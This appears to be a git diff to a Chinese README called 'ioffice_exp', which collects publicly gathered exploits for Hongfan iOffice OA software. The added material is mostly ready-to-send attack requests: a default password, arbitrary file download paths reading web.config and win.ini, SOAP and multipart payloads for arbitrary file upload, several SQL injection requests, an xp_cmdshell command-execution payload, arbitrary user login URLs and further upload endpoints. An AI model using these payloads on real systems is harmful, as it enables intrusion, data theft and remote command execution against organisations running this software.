@@ -1,6 +1,65 @@
 # ioffice_exp 从互联网收集的红帆oa漏洞
+## 默认密码
+```
+Everyone / 111111     
+```
 ## ioFileDown.aspx任意文件下载
-/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config
+/ioffice/prg/interface/ioFileDown.aspx?sFilePath=/ioffice/web.config  
+/iOffice/prg/set/ioCom/ioFileExport.aspx?url=C:/Windows/win.ini
+## FaxService.asmx 任意文件上传
+```
+/iOffice/prg/set/wss/FaxService.asmx
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <SaveConvertTif xmlns="http://tempuri.org/">
+      <FaxID>1</FaxID>
+      <Pages>2</Pages>
+      <FileName>../../../../2.txt</FileName>
+      <FileContent>dGVzdDEyMw==</FileContent>
+    </SaveConvertTif>
+  </soap:Body>
+</soap:Envelope>
+```
+## iorepsavexml.aspx任意文件上传
+```
+/iOffice/prg/set/report/iorepsavexml.aspx?key=writefile&filename=hiword.txt&filepath=/upfiles/rep/pic/
+```
+## ioRepPicAdd.aspx任意文件上传
+```
+/ioffice/prg/set/Report/ioRepPicAdd.aspx
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__EVENTTARGET"
+
+ctl00$cntButton$cmdOK
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__EVENTARGUMENT"
+
+
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="__VIEWSTATE"
+
+qqqq
+------WebKitFormBoundary92UKW0leBBAHGaI4
+Content-Disposition: form-data; name="ctl00$cntForm$File1"; filename="hiword.txt"
+Content-Type: image/png
+
+hiword!!!
+
+------WebKitFormBoundary92UKW0leBBAHGaI4--
+```
+## ioAssistance.asmx sql注入导致rce
+```http
+/ioffice/prg/set/wss/ioAssistance.asmx
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/\">
+<soap:Body>
+  <GetLoginedEmpNoReadedInf xmlns="http://tempuri.org/">
+<sql>exec master.dbo.xp_cmdshell 'cmd /c  whoami'</sql>
+</GetLoginedEmpNoReadedInf>
+</soap:Body>
+</soap:Envelope>
+```
 ## udfGetDocStep.asmx sql注入
 ```http
 POST /ioffice/prg/interface/udfGetDocStep.asmx HTTP/1.1
@@ -43,7 +102,8 @@ Content-Length: 282
 </soap:Envelope>
 ```
 ## 任意用户登录
-/iOffice/prg/interface/iologin215host.aspx
+/iOffice/prg/interface/iologin215host.aspx  
+/iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1
 ## wssRtSyn.asmx sql注入
 /iOffice/prg/set/wss/wssRtSyn.asmx?op=SubmitShowMsg
 ```http
@@ -125,4 +185,39 @@ SOAPAction: "http://tempuri.org/GetEmpInf"
    </GetEmpInf>
  </soap:Body>
 </soap:Envelope>
+```
+## udfmr.asmx sql注入
+```
+POST http://xxx/iOffice/prg/set/wss/udfmr.asmx HTTP/1.0
+Host: xxxx
+X-Real-IP: xxxx
+X-Forwarded-For: xxxx
+Connection: close
+Content-Type: text/xml; charset=utf-8
+SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
+
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">
+<condition>1=@@version</condition>
+</GetEmpSearch>
+</soap:Body>
+</soap:Envelope>
+```
+## ioFileExport.aspx后台任意文件读取
+```
+/iOffice/prg/set/iocom/ioFileExport.aspx? url=/ioffice/upfiles/otherfiles/Picture/3/2023/4/eee.asp=eee.asp&ContentType=application/octet-stream
+/iOffice/prg/set/iocom/ioFileExport.aspx? url=xxxxxxxx&filename=eeee.asp&ContentType=application/octet-stream
+```
+## 后台任意文件上传
+```
+/ioffice/prg/udf/Component/imgupload.aspx
+需要修改Content-Type: image/png
+```
+其他上传点
+```
+/ioffice/prg/set/HtmlEdit/editor/dialog/fck_upload.aspx
+/ioffice/prg/set/HtmlEdit/plugins/image.aspx
 ```
